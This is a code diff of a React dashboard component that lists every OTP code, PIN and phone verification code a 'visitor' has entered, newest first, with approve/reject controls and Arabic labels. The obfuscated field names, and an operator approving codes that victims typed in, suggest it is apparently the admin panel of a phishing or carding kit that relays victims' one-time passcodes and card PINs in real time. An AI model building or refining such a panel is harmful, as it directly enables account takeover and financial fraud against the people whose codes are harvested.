@@ -295,60 +295,69 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     }
   })
     
-    // OTP Code - check history first
-    const latestOtpHistory = visitor.history?.find((h: any) => h.entryType === '_t2' || h.entryType === 'otp')
-    const otp = latestOtpHistory?.data?._v5 || visitor._v5 || visitor.otp
+    // OTP Code - Show ALL attempts from history (newest first)
+    const allOtpHistory = visitor.history?.filter((h: any) => h.type === '_t2' || h.type === 'otp') || []
+    const sortedOtpHistory = allOtpHistory.sort((a: any, b: any) => {
+      const timeA = new Date(a.timestamp).getTime()
+      const timeB = new Date(b.timestamp).getTime()
+      return timeB - timeA
+    })
     
-    if (otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
-      // Prepare data object
-      const otpData: Record<string, any> = {
-        "الكود": otp || "في انتظار الإدخال...",
-        "الحالة": visitor.otpStatus === "approved" ? "✓ تم القبول" : 
-                  visitor.otpStatus === "rejected" ? "✗ تم الرفض" :
-                  otp ? "تم إدخال الكود" : "في انتظار الإدخال"
-      }
+    sortedOtpHistory.forEach((otpHistory: any, index: number) => {
+      const otp = otpHistory.data?._v5
+      const hasBeenActioned = otpHistory.status === 'approved' || otpHistory.status === 'rejected'
       
-      // Add old rejected OTPs if they exist
-      if (visitor.oldOtp && visitor.oldOtp.length > 0) {
-        otpData["الأكواد المرفوضة السابقة"] = visitor.oldOtp.map(item => item.code).join(", ")
+      if (otp) {
+        bubbles.push({
+          id: `otp-${otpHistory.id || index}`,
+          title: index === 0 ? "كود OTP" : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
+          icon: "🔑",
+          color: "pink",
+          data: {
+            "الكود": otp,
+            "الحالة": otpHistory.status === "approved" ? "✓ تم القبول" : 
+                      otpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+          },
+          timestamp: otpHistory.timestamp,
+          status: otpHistory.status || "pending" as const,
+          showActions: !hasBeenActioned,
+          isLatest: index === 0,
+          type: "otp"
+        })
       }
+    })
+    
+    // PIN Code - Show ALL attempts from history (newest first)
+    const allPinHistory = visitor.history?.filter((h: any) => h.type === '_t3' || h.type === 'pin') || []
+    const sortedPinHistory = allPinHistory.sort((a: any, b: any) => {
+      const timeA = new Date(a.timestamp).getTime()
+      const timeB = new Date(b.timestamp).getTime()
+      return timeB - timeA
+    })
+    
+    sortedPinHistory.forEach((pinHistory: any, index: number) => {
+      const pinCode = pinHistory.data?._v6
+      const hasBeenActioned = pinHistory.status === 'approved' || pinHistory.status === 'rejected'
       
-      bubbles.push({
-        id: "otp-current",
-        title: "كود OTP",
-        icon: "🔑",
-        color: "pink",
-        data: otpData,
-        timestamp: visitor.otpUpdatedAt || visitor.updatedAt,
-        status: visitor.otpStatus === "approved" ? "approved" as const :
-                visitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: otp && visitor.otpStatus !== "approved" && visitor.otpStatus !== "rejected",
-        isLatest: true,
-        type: "otp"
-      })
-    }
-    
-    // PIN Code - check history first
-    const latestPinHistory = visitor.history?.find((h: any) => h.entryType === '_t3' || h.entryType === 'pin')
-    const pinCode = latestPinHistory?.data?._v6 || visitor._v6 || visitor.pinCode
-    
-    if (pinCode || visitor.otpStatus === "show_pin") {
-      bubbles.push({
-        id: "pin-current",
-        title: "رمز PIN",
-        icon: "🔐",
-        color: "indigo",
-        data: {
-          "الكود": pinCode || "في انتظار الإدخال...",
-          "الحالة": pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
-        },
-        timestamp: visitor.pinUpdatedAt || visitor.updatedAt,
-        status: "pending" as const,
-        showActions: false,
-        isLatest: true,
-        type: "pin"
-      })
-    }
+      if (pinCode) {
+        bubbles.push({
+          id: `pin-${pinHistory.id || index}`,
+          title: index === 0 ? "رمز PIN" : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
+          icon: "🔐",
+          color: "indigo",
+          data: {
+            "الكود": pinCode,
+            "الحالة": pinHistory.status === "approved" ? "✓ تم القبول" : 
+                      pinHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+          },
+          timestamp: pinHistory.timestamp,
+          status: pinHistory.status || "pending" as const,
+          showActions: !hasBeenActioned,
+          isLatest: index === 0,
+          type: "pin"
+        })
+      }
+    })
     
     // Phone Info
     if (visitor.phoneCarrier) {
@@ -369,38 +378,37 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       })
     }
     
-    // Phone OTP - check history first
-    const latestPhoneOtpHistory = visitor.history?.find((h: any) => h.entryType === '_t5' || h.entryType === 'phone_otp')
-    const phoneOtp = latestPhoneOtpHistory?.data?._v7 || visitor._v7 || visitor.phoneOtp
+    // Phone OTP - Show ALL attempts from history (newest first)
+    const allPhoneOtpHistory = visitor.history?.filter((h: any) => h.type === '_t5' || h.type === 'phone_otp') || []
+    const sortedPhoneOtpHistory = allPhoneOtpHistory.sort((a: any, b: any) => {
+      const timeA = new Date(a.timestamp).getTime()
+      const timeB = new Date(b.timestamp).getTime()
+      return timeB - timeA
+    })
     
-    if (phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
-      // Prepare data object
-      const phoneOtpData: Record<string, any> = {
-        "كود التحقق": phoneOtp || "في انتظار الإدخال...",
-        "الحالة": visitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
-                  visitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
-                  phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
-      }
+    sortedPhoneOtpHistory.forEach((phoneOtpHistory: any, index: number) => {
+      const phoneOtp = phoneOtpHistory.data?._v7
+      const hasBeenActioned = phoneOtpHistory.status === 'approved' || phoneOtpHistory.status === 'rejected'
       
-      // Add old rejected phone OTPs if they exist
-      if (visitor.allPhoneOtps && visitor.allPhoneOtps.length > 0) {
-        phoneOtpData["الأكواد المرفوضة السابقة"] = visitor.allPhoneOtps.join(", ")
+      if (phoneOtp) {
+        bubbles.push({
+          id: `phone-otp-${phoneOtpHistory.id || index}`,
+          title: index === 0 ? "كود تحقق الهاتف" : `كود تحقق الهاتف (محاولة ${sortedPhoneOtpHistory.length - index})`,
+          icon: "✅",
+          color: "pink",
+          data: {
+            "كود التحقق": phoneOtp,
+            "الحالة": phoneOtpHistory.status === "approved" ? "✓ تم القبول" : 
+                      phoneOtpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+          },
+          timestamp: phoneOtpHistory.timestamp,
+          status: phoneOtpHistory.status || "pending" as const,
+          showActions: !hasBeenActioned,
+          isLatest: index === 0,
+          type: "phone_otp"
+        })
       }
-      
-      bubbles.push({
-        id: "phone-otp-current",
-        title: "كود تحقق الهاتف",
-        icon: "✅",
-        color: "pink",
-        data: phoneOtpData,
-        timestamp: visitor.phoneOtpUpdatedAt || visitor.updatedAt,
-        status: visitor.phoneOtpStatus === "approved" ? "approved" as const :
-                visitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
-        showActions: phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected",
-        isLatest: true,
-        type: "phone_otp"
-      })
-    }
+    })
   // } // Removed - no longer needed
 
   // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
